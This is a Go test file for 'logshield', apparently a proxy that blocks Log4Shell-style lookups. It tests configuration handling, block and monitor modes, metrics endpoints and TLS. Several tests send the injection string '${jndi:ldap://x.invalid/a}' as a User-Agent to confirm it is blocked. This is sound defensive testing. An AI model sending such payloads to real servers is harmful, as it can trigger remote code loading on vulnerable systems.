package main

import (
	"bytes"
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/json"
	"encoding/pem"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"
)

type syncBuffer struct {
	mu sync.Mutex
	b  bytes.Buffer
}

func (s *syncBuffer) Write(p []byte) (int, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.b.Write(p)
}
func (s *syncBuffer) String() string { s.mu.Lock(); defer s.mu.Unlock(); return s.b.String() }

func TestRunUsageErrors(t *testing.T) {
	tests := []struct {
		name       string
		args       []string
		wantCode   int
		wantStdout string
		wantStderr string
	}{
		{name: "version flag", args: []string{"-version"}, wantCode: 0, wantStdout: "logshield "},
		{name: "upstream is required", args: nil, wantCode: 2, wantStderr: "upstream is required"},
		{name: "unknown flag", args: []string{"-nope"}, wantCode: 2, wantStderr: "flag provided but not defined"},
		{name: "bad log level", args: []string{"-log-level", "loud", "-upstream", "http://x"}, wantCode: 2, wantStderr: "unknown log level"},
		{name: "unparseable upstream", args: []string{"-upstream", "http://[::1"}, wantCode: 2, wantStderr: "not a valid URL"},
		{name: "invalid configuration reports every problem", args: []string{"-upstream", "ftp://x/p", "-mode", "audit", "-forwarded-for", "x"}, wantCode: 2, wantStderr: "unknown mode"},
		{name: "listen failure", args: []string{"-upstream", "http://127.0.0.1:1", "-listen", "256.0.0.1:99999"}, wantCode: 1, wantStderr: "logshield:"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			var out, errb bytes.Buffer
			code := run(context.Background(), tc.args, &out, &errb, nil)
			if code != tc.wantCode {
				t.Errorf("exit code = %d, want %d (stderr %q)", code, tc.wantCode, errb.String())
			}
			if !strings.Contains(out.String(), tc.wantStdout) {
				t.Errorf("stdout = %q, want %q", out.String(), tc.wantStdout)
			}
			if !strings.Contains(errb.String(), tc.wantStderr) {
				t.Errorf("stderr = %q, want %q", errb.String(), tc.wantStderr)
			}
		})
	}
}

// The whole program: start, proxy a clean and a hostile request, shut down.
func TestRunServesAndShutsDown(t *testing.T) {
	hits := 0
	var mu sync.Mutex
	up := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		mu.Lock()
		hits++
		mu.Unlock()
		_, _ = io.WriteString(w, "backend")
	}))
	defer up.Close()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	addrc := make(chan string, 1)
	errb := &syncBuffer{}
	done := make(chan int, 1)
	go func() {
		done <- run(ctx, []string{"-listen", "127.0.0.1:0", "-upstream", up.URL, "-mode", "block", "-skip-body-type", "image/"}, io.Discard, errb, func(a string) { addrc <- a })
	}()
	var addr string
	select {
	case addr = <-addrc:
	case code := <-done:
		t.Fatalf("exited early with %d: %s", code, errb.String())
	case <-time.After(5 * time.Second):
		t.Fatal("did not start")
	}

	get := func(ua string) int {
		req, _ := http.NewRequestWithContext(context.Background(), http.MethodGet, "http://"+addr+"/", nil)
		req.Header.Set("User-Agent", ua)
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatal(err)
		}
		_ = resp.Body.Close()
		return resp.StatusCode
	}
	if code := get("curl/8"); code != 200 {
		t.Errorf("clean request: %d", code)
	}
	if code := get("${jndi:ldap://x.invalid/a}"); code != 403 {
		t.Errorf("attack: %d", code)
	}
	mu.Lock()
	if hits != 1 {
		t.Errorf("upstream hits = %d, want 1", hits)
	}
	mu.Unlock()

	cancel()
	select {
	case code := <-done:
		if code != 0 {
			t.Errorf("exit code %d: %s", code, errb.String())
		}
	case <-time.After(10 * time.Second):
		t.Fatal("did not shut down")
	}
	logs := errb.String()
	if !strings.Contains(logs, `"msg":"listening"`) || !strings.Contains(logs, `"msg":"request blocked"`) || !strings.Contains(logs, `"msg":"stopped"`) {
		t.Errorf("expected log lines missing:\n%s", logs)
	}
	if strings.Contains(logs, "${") {
		t.Errorf("log contains an active lookup:\n%s", logs)
	}
}

func TestMonitorModeAnnouncesItself(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	errb := &syncBuffer{}
	done := make(chan int, 1)
	ready := make(chan struct{})
	go func() {
		done <- run(ctx, []string{"-listen", "127.0.0.1:0", "-upstream", "http://127.0.0.1:1"}, io.Discard, errb, func(string) { close(ready) })
	}()
	<-ready
	cancel()
	if code := <-done; code != 0 {
		t.Errorf("exit %d", code)
	}
	if !strings.Contains(errb.String(), "monitor mode") {
		t.Errorf("no monitor-mode notice:\n%s", errb.String())
	}
}

// Metrics and health endpoints work end to end and shutdown drains cleanly.
func TestAdminEndpoints(t *testing.T) {
	up := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) { _, _ = io.WriteString(w, "ok") }))
	defer up.Close()
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	addrc := make(chan string, 1)
	errb := &syncBuffer{}
	done := make(chan int, 1)
	go func() {
		done <- run(ctx, []string{"-listen", "127.0.0.1:0", "-upstream", up.URL, "-mode", "block", "-admin-listen", "127.0.0.1:0", "-max-in-flight", "8"},
			io.Discard, errb, func(a string) { addrc <- a })
	}()
	addr := <-addrc

	do := func(url, ua string) (int, string) {
		req, _ := http.NewRequestWithContext(context.Background(), http.MethodGet, url, nil)
		if ua != "" {
			req.Header.Set("User-Agent", ua)
		}
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatal(err)
		}
		defer func() { _ = resp.Body.Close() }()
		b, _ := io.ReadAll(resp.Body)
		return resp.StatusCode, string(b)
	}
	do("http://"+addr+"/", "curl/8")
	do("http://"+addr+"/", "${jndi:ldap://x.invalid/a}")

	// The admin address is announced in the log (the port was chosen by the OS).
	var admin string
	for _, line := range strings.Split(errb.String(), "\n") {
		if strings.Contains(line, `"msg":"admin endpoints"`) {
			var rec struct{ Addr string }
			_ = json.Unmarshal([]byte(line), &rec)
			admin = rec.Addr
		}
	}
	if admin == "" {
		t.Fatalf("admin address not logged:\n%s", errb.String())
	}
	if code, _ := do("http://"+admin+"/healthz", ""); code != 200 {
		t.Errorf("healthz %d", code)
	}
	if code, _ := do("http://"+admin+"/readyz", ""); code != 200 {
		t.Errorf("readyz %d", code)
	}
	_, metrics := do("http://"+admin+"/metrics", "")
	for _, want := range []string{
		`logshield_requests_total{action="forwarded",decision="clean",mode="block"} 1`,
		`logshield_requests_total{action="blocked",decision="malicious",mode="block"} 1`,
		`logshield_rule_detections_total{rule="LSH-1001"} 1`,
	} {
		if !strings.Contains(metrics, want) {
			t.Errorf("metrics missing %q", want)
		}
	}
	// Admin paths are not reachable through the proxy port.
	if _, body := do("http://"+addr+"/metrics", ""); strings.Contains(body, "logshield_") {
		t.Error("metrics leaked through the proxy port")
	}

	cancel()
	if code := <-done; code != 0 {
		t.Errorf("exit %d: %s", code, errb.String())
	}
}

func TestAdminListenerErrorIsReported(t *testing.T) {
	var lc net.ListenConfig
	busy, err := lc.Listen(context.Background(), "tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = busy.Close() }()
	errb := &syncBuffer{}
	code := run(context.Background(), []string{"-listen", "127.0.0.1:0", "-upstream", "http://127.0.0.1:1", "-admin-listen", busy.Addr().String()}, io.Discard, errb, nil)
	if code != 1 || !strings.Contains(errb.String(), "admin listener") {
		t.Errorf("exit %d: %s", code, errb.String())
	}
}

func TestUpstreamAddr(t *testing.T) {
	for in, want := range map[string]string{
		"http://a.example:8080": "a.example:8080",
		"http://a.example":      "a.example:80",
		"https://a.example":     "a.example:443",
		"https://[::1]":         "[::1]:443",
	} {
		u, _ := url.Parse(in)
		if got := upstreamAddr(u); got != want {
			t.Errorf("%s -> %s, want %s", in, got, want)
		}
	}
}

func runOnce(t *testing.T, args ...string) (int, string, string) {
	t.Helper()
	var out, errb bytes.Buffer
	code := run(context.Background(), args, &out, &errb, nil)
	return code, out.String(), errb.String()
}

func writeConfig(t *testing.T, content string) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), "c.json")
	if err := os.WriteFile(p, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
	return p
}

// File < environment < flags, and -check-config shows the result.
func TestConfigurationPrecedence(t *testing.T) {
	file := writeConfig(t, `{"upstream":"http://file:1","mode":"block","max_in_flight":5,"listen":"127.0.0.1:1111"}`)

	code, out, errs := runOnce(t, "-config", file, "-check-config")
	if code != 0 || !strings.Contains(out, `"mode": "block"`) || !strings.Contains(out, `"upstream": "http://file:1"`) {
		t.Fatalf("file only: %d %s %s", code, out, errs)
	}

	t.Setenv("LOGSHIELD_MODE", "monitor")
	t.Setenv("LOGSHIELD_MAX_IN_FLIGHT", "7")
	code, out, _ = runOnce(t, "-config", file, "-check-config")
	if code != 0 || !strings.Contains(out, `"mode": "monitor"`) || !strings.Contains(out, `"max_in_flight": 7`) {
		t.Errorf("environment must override the file: %d %s", code, out)
	}

	code, out, _ = runOnce(t, "-config", file, "-mode", "block", "-max-in-flight", "9", "-check-config")
	if code != 0 || !strings.Contains(out, `"mode": "block"`) || !strings.Contains(out, `"max_in_flight": 9`) || !strings.Contains(out, "127.0.0.1:1111") {
		t.Errorf("flags must override the environment and leave the rest alone: %d %s", code, out)
	}

	t.Setenv("LOGSHIELD_CONFIG", file)
	if code, out, _ = runOnce(t, "-check-config"); code != 0 || !strings.Contains(out, "http://file:1") {
		t.Errorf("$LOGSHIELD_CONFIG not used: %d %s", code, out)
	}
}

func TestConfigurationErrors(t *testing.T) {
	for name, tc := range map[string]struct {
		args []string
		env  map[string]string
		want string
	}{
		"missing file":         {args: []string{"-config", "/nonexistent/x.json"}, want: "configuration file"},
		"unknown key":          {args: []string{"-config", writeConfig(t, `{"upstrem":"x"}`)}, want: "unknown field"},
		"bad environment":      {args: []string{"-upstream", "http://x"}, env: map[string]string{"LOGSHIELD_MAX_IN_FLIGHT": "lots"}, want: "LOGSHIELD_MAX_IN_FLIGHT"},
		"unknown rule":         {args: []string{"-upstream", "http://x", "-disable-rule", "LSH-9999"}, want: "LSH-9999"},
		"mandatory rule":       {args: []string{"-upstream", "http://x", "-disable-rule", "LSH-3001"}, want: "mandatory"},
		"credentials in url":   {args: []string{"-upstream", "http://u:pw@x"}, want: "credentials"},
		"invalid check-config": {args: []string{"-check-config"}, want: "upstream is required"},
	} {
		t.Run(name, func(t *testing.T) {
			for k, v := range tc.env {
				t.Setenv(k, v)
			}
			code, _, errs := runOnce(t, tc.args...)
			if code != 2 || !strings.Contains(errs, tc.want) || strings.Contains(errs, "pw@") {
				t.Errorf("exit %d, stderr %q, want %q", code, errs, tc.want)
			}
		})
	}
}

func TestUnknownEnvironmentVariableIsWarnedAbout(t *testing.T) {
	t.Setenv("LOGSHIELD_UPSTREM", "x")
	code, _, errs := runOnce(t, "-upstream", "http://x", "-check-config")
	if code != 0 || !strings.Contains(errs, "LOGSHIELD_UPSTREM") {
		t.Errorf("exit %d, stderr %q", code, errs)
	}
}

func TestRepeatableFlagsReachTheProxy(t *testing.T) {
	code, out, errs := runOnce(t, "-upstream", "http://x", "-skip-body-type", "image/", "-skip-body-type", "video/", "-disable-rule", "LSH-2001", "-check-config")
	if code != 0 || !strings.Contains(out, `"image/"`) || !strings.Contains(out, `"video/"`) || !strings.Contains(out, `"LSH-2001"`) {
		t.Errorf("exit %d\n%s\n%s", code, out, errs)
	}
}

// The binary serves HTTPS and HTTP/2 when given a certificate, and refuses bad TLS settings.
func TestRunServesTLS(t *testing.T) {
	dir := t.TempDir()
	certFile, keyFile, pool := testCert(t, dir)
	up := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) { _, _ = io.WriteString(w, "backend") }))
	defer up.Close()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	addrc := make(chan string, 1)
	errb := &syncBuffer{}
	done := make(chan int, 1)
	go func() {
		done <- run(ctx, []string{"-listen", "127.0.0.1:0", "-upstream", up.URL, "-mode", "block", "-tls-cert", certFile, "-tls-key", keyFile, "-tls-min-version", "1.3"},
			io.Discard, errb, func(a string) { addrc <- a })
	}()
	addr := <-addrc

	client := &http.Client{Timeout: 5 * time.Second, Transport: &http.Transport{
		ForceAttemptHTTP2: true,
		TLSClientConfig:   &tls.Config{RootCAs: pool, ServerName: "localhost", MinVersion: tls.VersionTLS13},
	}}
	get := func(ua string) (int, string) {
		req, _ := http.NewRequestWithContext(context.Background(), http.MethodGet, "https://"+addr+"/", nil)
		req.Header.Set("User-Agent", ua)
		resp, err := client.Do(req)
		if err != nil {
			t.Fatal(err)
		}
		defer func() { _ = resp.Body.Close() }()
		return resp.StatusCode, resp.Proto
	}
	if code, proto := get("curl/8"); code != 200 || proto != "HTTP/2.0" {
		t.Errorf("clean: %d %s", code, proto)
	}
	if code, _ := get("${jndi:ldap://x.invalid/a}"); code != 403 {
		t.Errorf("attack: %d", code)
	}
	// Plain HTTP to the TLS port must not work.
	if resp, err := http.Get("http://" + addr + "/"); err == nil { //nolint:noctx // deliberately a plain request to a TLS port
		_ = resp.Body.Close()
		if resp.StatusCode == http.StatusOK {
			t.Error("plain HTTP was served on the TLS port")
		}
	}
	cancel()
	if code := <-done; code != 0 {
		t.Errorf("exit %d: %s", code, errb.String())
	}
	if !strings.Contains(errb.String(), `"tls":true`) {
		t.Errorf("startup log does not say TLS is on:\n%s", errb.String())
	}
}

func TestBadTLSSettingsFailAtStartup(t *testing.T) {
	code, _, errs := runOnce(t, "-upstream", "http://x", "-tls-cert", "/nonexistent.crt", "-tls-key", "/nonexistent.key")
	if code != 2 || !strings.Contains(errs, "tls certificate") {
		t.Errorf("exit %d: %s", code, errs)
	}
	code, _, errs = runOnce(t, "-upstream", "http://x", "-tls-cert", "only.crt")
	if code != 2 || !strings.Contains(errs, "together") {
		t.Errorf("exit %d: %s", code, errs)
	}
}

func testCert(t *testing.T, dir string) (certFile, keyFile string, pool *x509.CertPool) {
	t.Helper()
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	tmpl := &x509.Certificate{
		SerialNumber: big.NewInt(1), Subject: pkix.Name{CommonName: "localhost"},
		NotBefore: time.Now().Add(-time.Hour), NotAfter: time.Now().Add(time.Hour),
		KeyUsage: x509.KeyUsageDigitalSignature, ExtKeyUsage: []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		IPAddresses: []net.IP{net.IPv4(127, 0, 0, 1)}, DNSNames: []string{"localhost"},
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		t.Fatal(err)
	}
	keyDER, _ := x509.MarshalECPrivateKey(key)
	certFile, keyFile = filepath.Join(dir, "c.crt"), filepath.Join(dir, "c.key")
	_ = os.WriteFile(certFile, pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der}), 0o600)
	_ = os.WriteFile(keyFile, pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER}), 0o600)
	cert, _ := x509.ParseCertificate(der)
	pool = x509.NewCertPool()
	pool.AddCert(cert)
	return certFile, keyFile, pool
}
